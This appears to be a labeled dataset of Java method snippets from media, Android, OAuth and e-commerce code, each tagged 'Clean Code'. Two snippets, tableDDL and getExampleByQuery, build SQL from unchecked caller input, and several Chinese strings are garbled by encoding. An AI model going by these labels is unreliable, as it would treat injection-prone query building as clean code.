"public ConcatenatedTimeline(Collection<MediaSourceHolder> mediaSourceHolders,int windowCount,int periodCount,ShuffleOrder shuffleOrder,boolean isAtomic){
  super(isAtomic,shuffleOrder);
  this.windowCount=windowCount;
  this.periodCount=periodCount;
  int childCount=mediaSourceHolders.size();
  firstPeriodInChildIndices=new int[childCount];
  firstWindowInChildIndices=new int[childCount];
  timelines=new Timeline[childCount];
  uids=new Object[childCount];
  childIndexByUid=new HashMap<>();
  int index=0;
  for (  MediaSourceHolder mediaSourceHolder : mediaSourceHolders) {
    timelines[index]=mediaSourceHolder.timeline;
    firstPeriodInChildIndices[index]=mediaSourceHolder.firstPeriodIndexInChild;
    firstWindowInChildIndices[index]=mediaSourceHolder.firstWindowIndexInChild;
    uids[index]=mediaSourceHolder.uid;
    childIndexByUid.put(uids[index],index++);
  }
}",0,Clean Code
"/** 
 * Resolves the result of a phi insn based on its operands. The ""void"" type, which is a nonsensical type for a register, is used for registers defined by as-of-yet-unresolved phi operations.
 * @return true if the result type changed, false if no change
 */
boolean resolveResultType(PhiInsn insn){
  insn.updateSourcesToDefinitions(ssaMeth);
  RegisterSpecList sources=insn.getSources();
  RegisterSpec first=null;
  int firstIndex=-1;
  int szSources=sources.size();
  for (int i=0; i < szSources; i++) {
    RegisterSpec rs=sources.get(i);
    if (rs.getBasicType() != Type.BT_VOID) {
      first=rs;
      firstIndex=i;
    }
  }
  if (first == null) {
    return false;
  }
  LocalItem firstLocal=first.getLocalItem();
  TypeBearer mergedType=first.getType();
  boolean sameLocals=true;
  for (int i=0; i < szSources; i++) {
    if (i == firstIndex) {
      continue;
    }
    RegisterSpec rs=sources.get(i);
    if (rs.getBasicType() == Type.BT_VOID) {
      continue;
    }
    sameLocals=sameLocals && equalsHandlesNulls(firstLocal,rs.getLocalItem());
    mergedType=Merger.mergeType(mergedType,rs.getType());
  }
  TypeBearer newResultType;
  if (mergedType != null) {
    newResultType=mergedType;
  }
 else {
    StringBuilder sb=new StringBuilder();
    for (int i=0; i < szSources; i++) {
      sb.append(sources.get(i).toString());
      sb.append(' ');
    }
    throw new RuntimeException(""Couldn't map types in phi insn:"" + sb);
  }
  LocalItem newLocal=sameLocals ? firstLocal : null;
  RegisterSpec result=insn.getResult();
  if ((result.getTypeBearer() == newResultType) && equalsHandlesNulls(newLocal,result.getLocalItem())) {
    return false;
  }
  insn.changeResultType(newResultType,newLocal);
  return true;
}",0,Clean Code
"private OidcClientRegistrationAuthenticationToken registerClient(OidcClientRegistrationAuthenticationToken clientRegistrationAuthentication,OAuth2Authorization authorization){
  if (!isValidRedirectUris(clientRegistrationAuthentication.getClientRegistration().getRedirectUris())) {
    throwInvalidClientRegistration(OAuth2ErrorCodes.INVALID_REDIRECT_URI,OidcClientMetadataClaimNames.REDIRECT_URIS);
  }
  if (!isValidRedirectUris(clientRegistrationAuthentication.getClientRegistration().getPostLogoutRedirectUris())) {
    throwInvalidClientRegistration(""invalid_client_metadata"",OidcClientMetadataClaimNames.POST_LOGOUT_REDIRECT_URIS);
  }
  if (!isValidTokenEndpointAuthenticationMethod(clientRegistrationAuthentication.getClientRegistration())) {
    throwInvalidClientRegistration(""invalid_client_metadata"",OidcClientMetadataClaimNames.TOKEN_ENDPOINT_AUTH_METHOD);
  }
  if (this.logger.isTraceEnabled()) {
    this.logger.trace(""Validated client registration request parameters"");
  }
  RegisteredClient registeredClient=this.registeredClientConverter.convert(clientRegistrationAuthentication.getClientRegistration());
  if (StringUtils.hasText(registeredClient.getClientSecret())) {
    RegisteredClient updatedRegisteredClient=RegisteredClient.from(registeredClient).clientSecret(this.passwordEncoder.encode(registeredClient.getClientSecret())).build();
    this.registeredClientRepository.save(updatedRegisteredClient);
    if (ClientAuthenticationMethod.CLIENT_SECRET_JWT.getValue().equals(clientRegistrationAuthentication.getClientRegistration().getTokenEndpointAuthenticationMethod())) {
      registeredClient=updatedRegisteredClient;
    }
  }
 else {
    this.registeredClientRepository.save(registeredClient);
  }
  if (this.logger.isTraceEnabled()) {
    this.logger.trace(""Saved registered client"");
  }
  OAuth2Authorization registeredClientAuthorization=registerAccessToken(registeredClient);
  authorization=OidcAuthenticationProviderUtils.invalidate(authorization,authorization.getAccessToken().getToken());
  if (authorization.getRefreshToken() != null) {
    authorization=OidcAuthenticationProviderUtils.invalidate(authorization,authorization.getRefreshToken().getToken());
  }
  this.authorizationService.save(authorization);
  if (this.logger.isTraceEnabled()) {
    this.logger.trace(""Saved authorization with invalidated initial access token"");
  }
  Map<String,Object> clientRegistrationClaims=this.clientRegistrationConverter.convert(registeredClient).getClaims();
  OidcClientRegistration clientRegistration=OidcClientRegistration.withClaims(clientRegistrationClaims).registrationAccessToken(registeredClientAuthorization.getAccessToken().getToken().getTokenValue()).build();
  if (this.logger.isTraceEnabled()) {
    this.logger.trace(""Authenticated client registration request"");
  }
  return new OidcClientRegistrationAuthenticationToken((Authentication)clientRegistrationAuthentication.getPrincipal(),clientRegistration);
}",0,Clean Code
"private void recreateInstructionSynchronized(final ZyLabelContent labelContent,final RawInstruction instruction,final int lineIndex){
  final RawBasicBlock basicblock=((BasicBlockLineObject)labelContent.getModel()).getRawBasicblock();
  final ESide side=basicblock.getSide();
  RawInstruction priInstruction=null;
  RawInstruction secInstruction=null;
  if (basicblock.getSide() == ESide.PRIMARY) {
    priInstruction=instruction;
    secInstruction=null;
    final RawBasicBlock secBasicblock=GraphGetter.getSecondaryRawBasicblock(graphContainer,basicblock);
    final BasicBlockMatchData basicblockMatch=MatchesGetter.getBasicBlockMatch(functionMatch,basicblock);
    if (basicblockMatch != null) {
      final IAddress secInstructionAddr=basicblockMatch.getSecondaryInstructionAddr(priInstruction.getAddress());
      secInstruction=secBasicblock.getInstruction(secInstructionAddr);
    }
  }
 else {
    priInstruction=null;
    secInstruction=instruction;
    final RawBasicBlock priBasicblock=GraphGetter.getPrimaryRawBasicblock(graphContainer,basicblock);
    final BasicBlockMatchData basicblockMatch=MatchesGetter.getBasicBlockMatch(functionMatch,basicblock);
    if (basicblockMatch != null) {
      final IAddress priInstructionAddr=basicblockMatch.getPrimaryInstructionAddr(secInstruction.getAddress());
      priInstruction=priBasicblock.getInstruction(priInstructionAddr);
    }
  }
  final int maxTopCommentLineCount=ViewCodeNodeBuilder.precalcMaxCommentLineCount(priInstruction,secInstruction,ECommentPlacement.ABOVE_LINE);
  final int maxRightCommentLineCount=ViewCodeNodeBuilder.precalcMaxCommentLineCount(priInstruction,secInstruction,ECommentPlacement.BEHIND_LINE);
  labelContent.setRightPadding(NODELABEL_PADDING);
  recreateInstruction(labelContent,instruction,lineIndex,maxTopCommentLineCount,maxRightCommentLineCount);
  SingleDiffNode otherDiffNode=null;
  if (side == ESide.PRIMARY) {
    otherDiffNode=GraphGetter.getSecondaryDiffNode(graphContainer.getPrimaryGraph(),basicblock);
  }
 else {
    otherDiffNode=GraphGetter.getPrimaryDiffNode(graphContainer.getSecondaryGraph(),basicblock);
  }
  if (otherDiffNode != null) {
    final ZyLabelContent otherLabelContent=otherDiffNode.getRealizer().getNodeContent();
    otherLabelContent.setRightPadding(NODELABEL_PADDING);
    recreateInstruction(otherLabelContent,side == ESide.PRIMARY ? secInstruction : priInstruction,lineIndex,maxTopCommentLineCount,maxRightCommentLineCount);
    final double width=labelContent.getBounds().getWidth();
    final double otherWidth=otherLabelContent.getBounds().getWidth();
    if (width > otherWidth) {
      otherLabelContent.setRightPadding((int)Math.round(width - otherWidth) + 10);
    }
 else {
      labelContent.setRightPadding((int)Math.round(otherWidth - width) + 10);
    }
    otherDiffNode.getRealizer().regenerate();
  }
  final SingleDiffNode diffNode=GraphGetter.getDiffNode(graphContainer,basicblock);
  diffNode.getRealizer().regenerate();
  graphContainer.getSuperGraph().refreshSuperNodeSize(graphContainer.getPrimaryGraph(),graphContainer.getSecondaryGraph(),diffNode.getSuperDiffNode());
  graphContainer.updateViews();
}",0,Clean Code
"private void applyCrossKey(View v,MotionEvent e){
  int[] boardPos=new int[2];
  int[] touchPos=new int[2];
  int[] shiftPos=new int[2];
  int buttonWidth=v.getWidth();
  int buttonheight=v.getHeight();
  crossKeyboard.getLocationOnScreen(boardPos);
  touchPos[0]=(int)e.getRawX();
  touchPos[1]=(int)e.getRawY();
  shiftPos[0]=touchPos[0] - boardPos[0];
  shiftPos[1]=touchPos[1] - boardPos[1];
  int location;
  if (shiftPos[0] < buttonWidth && shiftPos[0] >= 0) {
    if (shiftPos[1] < buttonheight && shiftPos[1] >= 0) {
      location=1;
    }
 else     if (shiftPos[1] <= buttonheight * 2 && shiftPos[1] >= buttonheight) {
      location=4;
    }
 else     if (shiftPos[1] > buttonheight * 2 && shiftPos[1] <= buttonheight * 3) {
      location=7;
    }
 else {
      location=0;
    }
  }
 else   if (shiftPos[0] <= buttonWidth * 2 && shiftPos[0] >= buttonWidth) {
    if (shiftPos[1] < buttonheight && shiftPos[1] >= 0) {
      location=2;
    }
 else     if (shiftPos[1] <= buttonheight * 2 && shiftPos[1] >= buttonheight) {
      location=5;
    }
 else     if (shiftPos[1] > buttonheight * 2 && shiftPos[1] <= buttonheight * 3) {
      location=8;
    }
 else {
      location=0;
    }
  }
 else   if (shiftPos[0] > buttonWidth * 2 && shiftPos[0] <= buttonWidth * 3) {
    if (shiftPos[1] < buttonheight && shiftPos[1] >= 0) {
      location=3;
    }
 else     if (shiftPos[1] <= buttonheight * 2 && shiftPos[1] >= buttonheight) {
      location=6;
    }
 else     if (shiftPos[1] > buttonheight * 2 && shiftPos[1] <= buttonheight * 3) {
      location=9;
    }
 else {
      location=0;
    }
  }
 else {
    location=0;
  }
  uiUpdate(location,e);
  makeKeyEvent(location,e);
}",0,Clean Code
"/** 
 * 鏍￠獙鍟嗗搧鍙傚姞鐨勬椿鍔ㄦ槸鍚﹀啿绐�
 * @param id     娲诲姩缂栧彿
 * @param spuIds 鍟嗗搧 SPU 缂栧彿鏁扮粍
 */
private void validateRewardActivitySpuConflicts(Long id,Collection<Long> spuIds){
  if (CollUtil.isEmpty(spuIds)) {
    return;
  }
  List<RewardActivityDO> rewardActivityList=getRewardActivityListBySpuIds(spuIds,asList(PromotionActivityStatusEnum.WAIT.getStatus(),PromotionActivityStatusEnum.RUN.getStatus()));
  if (id != null) {
    rewardActivityList.removeIf(activity -> id.equals(activity.getId()));
  }
  if (CollUtil.isNotEmpty(rewardActivityList)) {
    throw exception(REWARD_ACTIVITY_SPU_CONFLICTS);
  }
}
",0,Clean Code
"private static long findChannelByProviderId(Context context,String providerId){
  final AtomicLong channelId=new AtomicLong(-1);
  visitChannels(context,(  Channel channel) -> {
    if (providerId.equals(channel.getInternalProviderId())) {
      if (channelId.get() == -1) {
        Log.d(TAG,""Channel found. ProviderId: "" + providerId);
        channelId.set(channel.getId());
      }
 else {
        Log.d(TAG,""Duplicate channel deleted. ProviderId: "" + providerId);
        deleteChannel(context,channel.getId());
      }
    }
    return true;
  }
);
  return channelId.get();
}",0,Clean Code
"private static boolean arrayEquals(Object o1,Object o2){
  if (o1 instanceof Object[] && o2 instanceof Object[]) {
    return Arrays.equals((Object[])o1,(Object[])o2);
  }
  if (o1 instanceof boolean[] && o2 instanceof boolean[]) {
    return Arrays.equals((boolean[])o1,(boolean[])o2);
  }
  if (o1 instanceof byte[] && o2 instanceof byte[]) {
    return Arrays.equals((byte[])o1,(byte[])o2);
  }
  if (o1 instanceof char[] && o2 instanceof char[]) {
    return Arrays.equals((char[])o1,(char[])o2);
  }
  if (o1 instanceof double[] && o2 instanceof double[]) {
    return Arrays.equals((double[])o1,(double[])o2);
  }
  if (o1 instanceof float[] && o2 instanceof float[]) {
    return Arrays.equals((float[])o1,(float[])o2);
  }
  if (o1 instanceof int[] && o2 instanceof int[]) {
    return Arrays.equals((int[])o1,(int[])o2);
  }
  if (o1 instanceof long[] && o2 instanceof long[]) {
    return Arrays.equals((long[])o1,(long[])o2);
  }
  if (o1 instanceof short[] && o2 instanceof short[]) {
    return Arrays.equals((short[])o1,(short[])o2);
  }
  return false;
}",0,Clean Code
"public static Object getDefaultValueObject(Class<?> type){
  if (type.isPrimitive()) {
    if (type.equals(byte.class)) {
      return Byte.valueOf((byte)0);
    }
 else     if (type.equals(char.class)) {
      return Character.valueOf('\0');
    }
 else     if (type.equals(short.class)) {
      return Short.valueOf((short)0);
    }
 else     if (type.equals(int.class)) {
      return Integer.valueOf(0);
    }
 else     if (type.equals(long.class)) {
      return Long.valueOf(0L);
    }
 else     if (type.equals(float.class)) {
      return Float.valueOf(0.0f);
    }
 else     if (type.equals(double.class)) {
      return Double.valueOf(0.0);
    }
 else     if (type.equals(boolean.class)) {
      return Boolean.valueOf(false);
    }
 else     if (type.equals(void.class)) {
      return null;
    }
 else {
      throw new IllegalArgumentException(""Unhandled primitive type: "" + type);
    }
  }
  return null;
}",0,Clean Code
"/** 
 * Adds listener for the details page.
 */
final void addListener(Listener listener){
  if (mListeners == null) {
    mListeners=new ArrayList<WeakReference<Listener>>();
  }
 else {
    for (int i=0; i < mListeners.size(); ) {
      Listener l=mListeners.get(i).get();
      if (l == null) {
        mListeners.remove(i);
      }
 else {
        if (l == listener) {
          return;
        }
        i++;
      }
    }
  }
  mListeners.add(new WeakReference<Listener>(listener));
}",0,Clean Code
"private void invalidateBlur(){
  if (stickerMakerView != null && stickerMakerView.isThanosInProgress) {
    return;
  }
  if (animationInProgress != 0) {
    return;
  }
  if (captionEdit != null) {
    captionEdit.invalidateBlur();
  }
  if (cutOutBtn != null) {
    cutOutBtn.invalidateBlur();
  }
  if (eraseBtn != null) {
    eraseBtn.invalidateBlur();
  }
  if (restoreBtn != null) {
    restoreBtn.invalidateBlur();
  }
  if (undoBtn != null) {
    undoBtn.invalidateBlur();
  }
  if (outlineBtn != null) {
    outlineBtn.invalidateBlur();
  }
  if (videoTimelineView != null) {
    videoTimelineView.invalidateBlur();
  }
  if (containerView != null) {
    containerView.invalidate();
  }
}",0,Clean Code
"@SuppressLint(""SdCardPath"") @NonNull public static BackupDataDirectoryInfo getInfo(@NonNull String dataDir,@UserIdInt int userId){
  String storageCe=String.format(Locale.ROOT,""/data/user/%d/"",userId);
  if (dataDir.startsWith(""/data/data/"") || dataDir.startsWith(storageCe)) {
    return new BackupDataDirectoryInfo(dataDir,true,TYPE_INTERNAL,TYPE_CREDENTIAL_PROTECTED);
  }
  String storageDe=String.format(Locale.ROOT,""/data/user_de/%d/"",userId);
  if (dataDir.startsWith(storageDe)) {
    return new BackupDataDirectoryInfo(dataDir,true,TYPE_INTERNAL,TYPE_DEVICE_PROTECTED);
  }
  if (dataDir.startsWith(""/sdcard/"")) {
    return getExternalInfo(dataDir,""/sdcard/"");
  }
  if (dataDir.startsWith(""/storage/sdcard/"")) {
    return getExternalInfo(dataDir,""/storage/sdcard/"");
  }
  if (dataDir.startsWith(""/storage/sdcard0/"")) {
    return getExternalInfo(dataDir,""/storage/sdcard0/"");
  }
  String storageEmulatedDir=String.format(Locale.ROOT,""/storage/emulated/%d/"",userId);
  if (dataDir.startsWith(storageEmulatedDir)) {
    return getExternalInfo(dataDir,storageEmulatedDir);
  }
  String dataMediaDir=String.format(Locale.ROOT,""/data/media/%d/"",userId);
  if (dataDir.startsWith(dataMediaDir)) {
    return getExternalInfo(dataDir,dataMediaDir);
  }
  Log.i(TAG,""getInfo: Unrecognized path %s, returning true as fallback."",dataDir);
  return new BackupDataDirectoryInfo(dataDir,true,TYPE_UNKNOWN,TYPE_CUSTOM);
}",0,Clean Code
"/** 
 * Coalesces a free entry replacing it and neighboring free entries with a single, larger entry. This method does nothing if  {@code entry} does not have free neighbors.
 * @param entry the free entry to coalesce with neighbors
 */
private void coalesce(FileUseMapEntry<?> entry){
  Preconditions.checkArgument(entry.isFree(),""!entry.isFree()"");
  FileUseMapEntry<?> prevToMerge=null;
  long start=entry.getStart();
  if (start > 0) {
    prevToMerge=map.floor(FileUseMapEntry.makeFree(start - 1,start));
    Verify.verifyNotNull(prevToMerge);
    if (!prevToMerge.isFree()) {
      prevToMerge=null;
    }
  }
  FileUseMapEntry<?> nextToMerge=null;
  long end=entry.getEnd();
  if (end < size) {
    nextToMerge=map.ceiling(FileUseMapEntry.makeFree(end,end + 1));
    Verify.verifyNotNull(nextToMerge);
    if (!nextToMerge.isFree()) {
      nextToMerge=null;
    }
  }
  if (prevToMerge == null && nextToMerge == null) {
    return;
  }
  long newStart=start;
  if (prevToMerge != null) {
    newStart=prevToMerge.getStart();
    internalRemove(prevToMerge);
  }
  long newEnd=end;
  if (nextToMerge != null) {
    newEnd=nextToMerge.getEnd();
    internalRemove(nextToMerge);
  }
  internalRemove(entry);
  internalAdd(FileUseMapEntry.makeFree(newStart,newEnd));
}",0,Clean Code
"/** 
 * sets up the utility with a map of known compressed to uncompressed suffix mappings and the default extension of the format.
 * @param uncompressSuffix Map from common file name suffixes ofcompressed files to the corresponding suffixes of uncompressed files. For example: from "".tgz"" to "".tar"".  This map also contains format-specific suffixes like "".gz"" and ""-z"".  These suffixes are mapped to the empty string, as they should simply be removed from the file name when the file is uncompressed.
 * @param defaultExtension the format's default extension like "".gz""
 */
public FileNameUtil(final Map<String,String> uncompressSuffix,final String defaultExtension){
  this.uncompressSuffix=Collections.unmodifiableMap(uncompressSuffix);
  int lc=Integer.MIN_VALUE, sc=Integer.MAX_VALUE;
  int lu=Integer.MIN_VALUE, su=Integer.MAX_VALUE;
  for (  final Map.Entry<String,String> ent : uncompressSuffix.entrySet()) {
    final int cl=ent.getKey().length();
    if (cl > lc) {
      lc=cl;
    }
    if (cl < sc) {
      sc=cl;
    }
    final String u=ent.getValue();
    final int ul=u.length();
    if (ul > 0) {
      if (!compressSuffix.containsKey(u)) {
        compressSuffix.put(u,ent.getKey());
      }
      if (ul > lu) {
        lu=ul;
      }
      if (ul < su) {
        su=ul;
      }
    }
  }
  longestCompressedSuffix=lc;
  longestUncompressedSuffix=lu;
  shortestCompressedSuffix=sc;
  shortestUncompressedSuffix=su;
  this.defaultExtension=defaultExtension;
}",0,Clean Code
"@Override public void onPageScrolled(float progress){
  if (progress == 1 && mediaPages[1].getVisibility() != View.VISIBLE) {
    return;
  }
  if (animatingForward) {
    mediaPages[0].setTranslationX(-progress * mediaPages[0].getMeasuredWidth());
    mediaPages[1].setTranslationX(mediaPages[0].getMeasuredWidth() - progress * mediaPages[0].getMeasuredWidth());
  }
 else {
    mediaPages[0].setTranslationX(progress * mediaPages[0].getMeasuredWidth());
    mediaPages[1].setTranslationX(progress * mediaPages[0].getMeasuredWidth() - mediaPages[0].getMeasuredWidth());
  }
  float photoVideoOptionsAlpha=0f;
  if (mediaPages[0].selectedType == 0) {
    photoVideoOptionsAlpha=1f - progress;
  }
  if (mediaPages[1].selectedType == 0) {
    photoVideoOptionsAlpha=progress;
  }
  photoVideoOptionsItem.setAlpha(photoVideoOptionsAlpha);
  photoVideoOptionsItem.setVisibility((photoVideoOptionsAlpha == 0 || !canShowSearchItem()) ? INVISIBLE : View.VISIBLE);
  if (canShowSearchItem()) {
    if (searchItemState == 1) {
      searchItem.setAlpha(progress);
    }
 else     if (searchItemState == 2) {
      searchItem.setAlpha(1.0f - progress);
    }
  }
 else {
    searchItem.setVisibility(INVISIBLE);
    searchItem.setAlpha(0.0f);
  }
  if (progress == 1) {
    MediaPage tempPage=mediaPages[0];
    mediaPages[0]=mediaPages[1];
    mediaPages[1]=tempPage;
    mediaPages[1].setVisibility(View.GONE);
    if (searchItemState == 2) {
      searchItem.setVisibility(View.INVISIBLE);
    }
    searchItemState=0;
    startStopVisibleGifs();
  }
}",0,Clean Code
"@Override public final void onMediaPeriodReleased(int windowIndex,MediaPeriodId mediaPeriodId){
  EventTime eventTime=generateMediaPeriodEventTime(windowIndex,mediaPeriodId);
  if (mediaPeriodQueueTracker.onMediaPeriodReleased(mediaPeriodId)) {
    for (    AnalyticsListener listener : listeners) {
      listener.onMediaPeriodReleased(eventTime);
    }
  }
}
/** 
 * Updates the queue with a released media period. Returns whether the media period was still in the queue.
 */
public boolean onMediaPeriodReleased(MediaPeriodId mediaPeriodId){
  MediaPeriodInfo mediaPeriodInfo=mediaPeriodIdToInfo.remove(mediaPeriodId);
  if (mediaPeriodInfo == null) {
    return false;
  }
  mediaPeriodInfoQueue.remove(mediaPeriodInfo);
  if (readingMediaPeriod != null && mediaPeriodId.equals(readingMediaPeriod.mediaPeriodId)) {
    readingMediaPeriod=mediaPeriodInfoQueue.isEmpty() ? null : mediaPeriodInfoQueue.get(0);
  }
  return true;
}",0,Clean Code
"/** 
 * Tries to convert the raw value into the provided type.
 * @param rawValue rawValue to convert into the provided type clazz
 * @param clazz clazz specifying the target type
 * @param < T > type of the result
 * @return the converted value if rawValue is of type clazz
 * @throws IllegalArgumentException if the rawValue cannot be converted in the specified targettype clazz
 */
@SuppressWarnings(""unchecked"") public static <T>T convertValue(Object rawValue,Class<?> clazz){
  if (Integer.class.equals(clazz)) {
    return (T)convertToInt(rawValue);
  }
 else   if (Long.class.equals(clazz)) {
    return (T)convertToLong(rawValue);
  }
 else   if (Boolean.class.equals(clazz)) {
    return (T)convertToBoolean(rawValue);
  }
 else   if (Float.class.equals(clazz)) {
    return (T)convertToFloat(rawValue);
  }
 else   if (Double.class.equals(clazz)) {
    return (T)convertToDouble(rawValue);
  }
 else   if (String.class.equals(clazz)) {
    return (T)convertToString(rawValue);
  }
 else   if (clazz.isEnum()) {
    return (T)convertToEnum(rawValue,(Class<? extends Enum<?>>)clazz);
  }
 else   if (clazz == Duration.class) {
    return (T)convertToDuration(rawValue);
  }
 else   if (clazz == Map.class) {
    return (T)convertToProperties(rawValue);
  }
  throw new IllegalArgumentException(""Unsupported type: "" + clazz);
}
",0,Clean Code
"public void setUserAvatar(TLRPC.User user){
  setUserAvatar(user,false);
}
public void setUserAvatar(TLRPC.User user,boolean showSelf){
  avatarDrawable.setInfo(currentAccount,user);
  if (UserObject.isReplyUser(user)) {
    avatarDrawable.setAvatarType(AvatarDrawable.AVATAR_TYPE_REPLIES);
    avatarDrawable.setScaleSize(.8f);
    if (avatarImageView != null) {
      avatarImageView.setImage(null,null,avatarDrawable,user);
    }
  }
 else   if (UserObject.isAnonymous(user)) {
    avatarDrawable.setAvatarType(AvatarDrawable.AVATAR_TYPE_ANONYMOUS);
    avatarDrawable.setScaleSize(.8f);
    if (avatarImageView != null) {
      avatarImageView.setImage(null,null,avatarDrawable,user);
    }
  }
 else   if (UserObject.isUserSelf(user) && !showSelf) {
    avatarDrawable.setAvatarType(AvatarDrawable.AVATAR_TYPE_SAVED);
    avatarDrawable.setScaleSize(.8f);
    if (avatarImageView != null) {
      avatarImageView.setImage(null,null,avatarDrawable,user);
    }
  }
 else {
    avatarDrawable.setScaleSize(1f);
    if (avatarImageView != null) {
      avatarImageView.setForUserOrChat(user,avatarDrawable);
    }
  }
}",0,Clean Code
"protected void onStopInternal(){
  View targetView=findViewByPosition(getTargetPosition());
  if (targetView == null) {
    if (getTargetPosition() >= 0) {
      scrollToSelection(getTargetPosition(),0,false,0);
    }
    return;
  }
  if (mFocusPosition != getTargetPosition()) {
    mFocusPosition=getTargetPosition();
  }
  if (hasFocus()) {
    mFlag|=PF_IN_SELECTION;
    targetView.requestFocus();
    mFlag&=~PF_IN_SELECTION;
  }
  dispatchChildSelected();
  dispatchChildSelectedAndPositioned();
}
@Override protected void onStopInternal(){
  super.onStopInternal();
  mPendingMoves=0;
  View v=findViewByPosition(getTargetPosition());
  if (v != null)   scrollToView(v,true);
}",0,Clean Code
"@Override public String tableDDL(Connection connection,String databaseName,String schemaName,String tableName){
  String sql=String.format(TABLE_DDL_SQL,tableName,schemaName);
  return SQLExecutor.getInstance().execute(connection,sql,resultSet -> {
    try {
      if (resultSet.next()) {
        return resultSet.getString(""sql"");
      }
    }
 catch (    SQLException e) {
      throw new RuntimeException(e);
    }
    return null;
  }
);
}
",0,Clean Code
"@Override public CfAccountExample getExampleByQuery(CfAccountQuery cfAccountQuery){
  CfAccountExample cfAccountExample=new CfAccountExample();
  CfAccountExample.Criteria criteria=cfAccountExample.createCriteria();
  if (cfAccountQuery.getId() != null) {
    criteria.andIdEqualTo(cfAccountQuery.getId());
  }
  if (StringUtils.isNotEmpty(cfAccountQuery.getUid())) {
    criteria.andUidEqualTo(cfAccountQuery.getUid());
  }
  if (StringUtils.isNotEmpty(cfAccountQuery.getScoreType())) {
    criteria.andScoreTypeEqualTo(cfAccountQuery.getScoreType());
  }
  if (cfAccountQuery.getType() != null) {
    criteria.andTypeEqualTo(cfAccountQuery.getType());
  }
  if (cfAccountQuery.getMinBalance() != null) {
    criteria.andBalanceGreaterThanOrEqualTo(cfAccountQuery.getMinBalance());
  }
  if (cfAccountQuery.getMaxBalance() != null) {
    criteria.andBalanceLessThanOrEqualTo(cfAccountQuery.getMaxBalance());
  }
  if (cfAccountQuery.getMinFreeze() != null) {
    criteria.andFreezeGreaterThanOrEqualTo(cfAccountQuery.getMinFreeze());
  }
  if (cfAccountQuery.getMaxFreeze() != null) {
    criteria.andFreezeLessThanOrEqualTo(cfAccountQuery.getMaxFreeze());
  }
  if (cfAccountQuery.getMinCreateTime() != null) {
    criteria.andCreateTimeGreaterThanOrEqualTo(cfAccountQuery.getMinCreateTime());
  }
  if (cfAccountQuery.getMaxCreateTime() != null) {
    criteria.andCreateTimeLessThanOrEqualTo(cfAccountQuery.getMaxCreateTime());
  }
  if (StringUtils.isNotEmpty(cfAccountQuery.getOrderBy())) {
    cfAccountExample.setOrderByClause(cfAccountQuery.getOrderBy());
  }
  if (cfAccountQuery.getPage() != null && cfAccountQuery.getSize() != null) {
    PageHelper.startPage(cfAccountQuery.getPage(),cfAccountQuery.getSize());
  }
  return cfAccountExample;
}
",0,Clean Code
"@Override public ServerResponseEntity<UserInfoInTokenBO> getUserInfoInTokenByInputUserNameAndPassword(String inputUserName,String password,Integer sysType){
  if (StrUtil.isBlank(inputUserName)) {
    return ServerResponseEntity.showFailMsg(""鐢ㄦ埛鍚嶄笉鑳戒负绌�"");
  }
  if (StrUtil.isBlank(password)) {
    return ServerResponseEntity.showFailMsg(""瀵嗙爜涓嶈兘涓虹┖"");
  }
  InputUserNameEnum inputUserNameEnum=null;
  if (PrincipalUtil.isUserName(inputUserName)) {
    inputUserNameEnum=InputUserNameEnum.USERNAME;
  }
  if (inputUserNameEnum == null) {
    return ServerResponseEntity.showFailMsg(""璇疯緭鍏ユ纭殑鐢ㄦ埛鍚�"");
  }
  AuthAccountInVerifyBO authAccountInVerifyBO=authAccountMapper.getAuthAccountInVerifyByInputUserName(inputUserNameEnum.value(),inputUserName,sysType);
  if (authAccountInVerifyBO == null) {
    prepareTimingAttackProtection();
    mitigateAgainstTimingAttack(password);
    return ServerResponseEntity.showFailMsg(""鐢ㄦ埛鍚嶆垨瀵嗙爜涓嶆纭�"");
  }
  if (Objects.equals(authAccountInVerifyBO.getStatus(),AuthAccountStatusEnum.DISABLE.value())) {
    return ServerResponseEntity.showFailMsg(""鐢ㄦ埛宸茬鐢紝璇疯仈绯诲鏈�"");
  }
  if (!passwordEncoder.matches(password,authAccountInVerifyBO.getPassword())) {
    return ServerResponseEntity.showFailMsg(""鐢ㄦ埛鍚嶆垨瀵嗙爜涓嶆纭�"");
  }
  return ServerResponseEntity.success(BeanUtil.map(authAccountInVerifyBO,UserInfoInTokenBO.class));
}
",0,Clean Code
"/** 
 * Returns whether  {@code drmSessionManager} supports the specified {@code drmInitData}, or true if  {@code drmInitData} is null.
 * @param drmSessionManager The drm session manager.
 * @param drmInitData {@link DrmInitData} of the format to check for support.
 * @return Whether {@code drmSessionManager} supports the specified {@code drmInitData}, or true if  {@code drmInitData} is null.
 */
protected static boolean supportsFormatDrm(@Nullable DrmSessionManager<?> drmSessionManager,@Nullable DrmInitData drmInitData){
  if (drmInitData == null) {
    return true;
  }
 else   if (drmSessionManager == null) {
    return false;
  }
  return drmSessionManager.canAcquireSession(drmInitData);
}
",0,Clean Code
"public DashMediaPeriod(int id,DashManifest manifest,int periodIndex,DashChunkSource.Factory chunkSourceFactory,@Nullable TransferListener transferListener,LoadErrorHandlingPolicy loadErrorHandlingPolicy,EventDispatcher eventDispatcher,long elapsedRealtimeOffsetMs,LoaderErrorThrower manifestLoaderErrorThrower,Allocator allocator,CompositeSequenceableLoaderFactory compositeSequenceableLoaderFactory,PlayerEmsgCallback playerEmsgCallback){
  this.id=id;
  this.manifest=manifest;
  this.periodIndex=periodIndex;
  this.chunkSourceFactory=chunkSourceFactory;
  this.transferListener=transferListener;
  this.loadErrorHandlingPolicy=loadErrorHandlingPolicy;
  this.eventDispatcher=eventDispatcher;
  this.elapsedRealtimeOffsetMs=elapsedRealtimeOffsetMs;
  this.manifestLoaderErrorThrower=manifestLoaderErrorThrower;
  this.allocator=allocator;
  this.compositeSequenceableLoaderFactory=compositeSequenceableLoaderFactory;
  playerEmsgHandler=new PlayerEmsgHandler(manifest,playerEmsgCallback,allocator);
  sampleStreams=newSampleStreamArray(0);
  eventSampleStreams=new EventSampleStream[0];
  trackEmsgHandlerBySampleStream=new IdentityHashMap<>();
  compositeSequenceableLoader=compositeSequenceableLoaderFactory.createCompositeSequenceableLoader(sampleStreams);
  Period period=manifest.getPeriod(periodIndex);
  eventStreams=period.eventStreams;
  Pair<TrackGroupArray,TrackGroupInfo[]> result=buildTrackGroups(period.adaptationSets,eventStreams);
  trackGroups=result.first;
  trackGroupInfos=result.second;
  eventDispatcher.mediaPeriodCreated();
}",0,Clean Code
"public List<List<Integer>> levelOrder(TreeNode root){
  Deque<TreeNode> deque=new LinkedList<>();
  List<List<Integer>> res=new ArrayList<>();
  if (root != null)   deque.add(root);
  while (!deque.isEmpty()) {
    List<Integer> tmp=new ArrayList<>();
